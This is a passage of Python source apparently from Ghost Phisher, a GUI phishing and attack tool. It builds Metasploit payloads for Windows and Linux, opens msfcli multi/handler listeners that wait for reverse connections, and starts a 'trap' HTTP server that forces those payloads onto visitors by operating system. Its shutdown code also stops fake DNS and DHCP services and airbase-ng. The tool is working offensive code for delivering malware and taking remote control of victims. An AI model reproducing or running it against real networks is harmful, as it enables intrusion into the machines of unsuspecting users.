            # Settings Metasploit Class variables

            self.metasploit_object.variables['encode_number'] = encoder_number
            self.metasploit_object.variables['encoder_type'] = encoder_type
            self.metasploit_object.variables['ip_address'] = ip_address
            self.metasploit_object.variables['port_setting'] = port_setting
            self.metasploit_object.variables['linux_payload'] = linux_payload
            self.metasploit_object.variables['windows_payload'] = windows_payload

            if os.path.exists(ghost_trap_http.control_settings['windows_payload']):     # Delete Old windows payload files
                os.remove(ghost_trap_http.control_settings['windows_payload'])

            if os.path.exists(ghost_trap_http.control_settings['linux_payload']):       # Delete Old Linux payload files
                os.remove(ghost_trap_http.control_settings['linux_payload'])

            self.metasploit_object.variables['template'] = os.getcwd() + os.sep + 'Cache/template.exe'
            self.metasploit_object.variables['output_path_windows'] = ghost_trap_http.control_settings['windows_payload']    # Create New windows payload file

            self.metasploit_object.variables['output_path_linux'] = ghost_trap_http.control_settings['linux_payload']

            self.metasploit_object.start()                               # Starts the Payload creation thread

            # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- WINDOWS
            windows_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Windows)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
            windows_console_string = windows_metapsloit_string % (windows_payload,ip_address,str(port_setting))
            subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)

            # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- LINUX
            linux_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Linux)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
            linux_console_string = linux_metapsloit_string % (linux_payload,ip_address,str(int(port_setting) + 1))
            subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)

        else:                                                       # If Custom payload is selected as Choice
            progress = 0
            if bool(self.windows_exec_checkbox.isChecked()) and bool(self.windows_exec_edit.text()):
                ghost_trap_http.control_settings['windows_payload'] = str(self.windows_exec_edit.text())
                ghost_settings.create_settings("self.windows_exec_edit",str(self.windows_exec_edit.text()))
                progress += 1
            else:
                self.display_payload_initlializaton(False)
                self.display_error_message("Custom windows payload is not setted, please check settings")

            if bool(self.linux_exec_checkbox.isChecked()) and bool(self.linux_exec_edit.text()):
                ghost_trap_http.control_settings['linux_payload'] = str(self.linux_exec_edit.text())
                ghost_settings.create_settings('self.linux_exec_edit',str(self.linux_exec_edit.text()))
                progress += 1
            else:
                self.display_payload_initlializaton(False)
                self.display_error_message('Custom linux payload is not setted, please check settings')

            if progress == 2:
                self.display_payload_initlializaton(True)
                self.display_information('green',"Setting Payloads...")
                self.Stage_3_process()
            else:
                self.display_error_message("Stopped")



    def Stage_3_process(self):
        self.display_cache_initialization(True)

        ghost_trap_http.set_payload_sizes()         # Sets payload sizes for HTML

        # EVALUATE HTTP SETTINGS HERE

        self.display_information('green',"Creating Cache objects...")   # Display next phase

        # HTML SETTINGS FOR USER INTERFACE GOES HERE

        if self.cookies_checkbox.isChecked():
            ghost_trap_http.control_settings['cookies'] = 1
        else:
            ghost_trap_http.control_settings['cookies'] = 0

        if self.force_download_checkbox.isChecked():
            ghost_trap_http.control_settings['force download'] = 1
        else:
            ghost_trap_http.control_settings['force download'] = 0

        if self.respond_to_all_radio.isChecked():
            ghost_trap_http.control_settings['answer all'] = 1
        else:
            ghost_trap_http.control_settings['answer all'] = 0

        if self.respond_windows_radio.isChecked():
            ghost_trap_http.control_settings['answer windows'] = 1
        else:
            ghost_trap_http.control_settings['answer windows'] = 0

        if self.respond_linux_radio.isChecked():
            ghost_trap_http.control_settings['answer linux'] = 1
        else:
            ghost_trap_http.control_settings['answer linux'] = 0

        ghost_trap_http.control_settings['port'] = str(self.ghost_trap_http_edit.text())
        ghost_trap_http.control_settings['ip_address'] = str(self.spawn_ip_combo.currentText())

        if os.environ["ghost_fake_http_control"] == "start":                            # Check if the Fake HTTP Server is running
            if str(self.ghost_trap_http_edit.text()) == str(self.use_port_http.text()):   # Check if the Fake HTTP Server and TRAP are running on same port
                QtGui.QMessageBox.warning(self,"Duplicate port settings","Ghost Fake HTTP Server is currently running on\
                the selected port, Please change either of the port settings")
                self.display_error_message("Stopped")
            else:
                self.Stage_4_process()
        else:
            self.Stage_4_process()



    def Stage_4_process(self):
        ghost_trap_http.start()
        self.ghost_spawn_start.setEnabled(False)
        self.ghost_spawn_stop.setEnabled(True)
        self.display_information("green","Starting HTTP Server...")
        self.display_information("green"," ")               # Leave a gap
        self.display_information("green","Started at %s"%(time.ctime()))
        self.display_information("green"," ")               # Leave a gap

        self.display_http_initlialization(True)




    #######################################################
    #               CLOSING GHOST PHISHER                 #
    #######################################################


    def closeEvent(self,event):
        ''' Close Network connections after
            user exits application
        '''
        global http_terminal
        answer = QtGui.QMessageBox.question(self,"Ghost Phisher","Are you sure you want to quit?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
        if answer == QtGui.QMessageBox.Yes:

            if(os.environ.get("ghost_fake_http_control") == "start"):
                    self.stop_http()

            if self.dns_control == 0:
                self.stop_dns()

            try:
                commands.getstatusoutput('killall airbase-ng')
                self.stop_dhcp()

            except NameError:
                pass
            if self.metasploit_object.isRunning():
                self.metasploit_object.terminate()
            commands.getstatusoutput("killall xterm")
            ghost_settings.close_setting_file()
            event.accept()
        else:
            event.ignore()


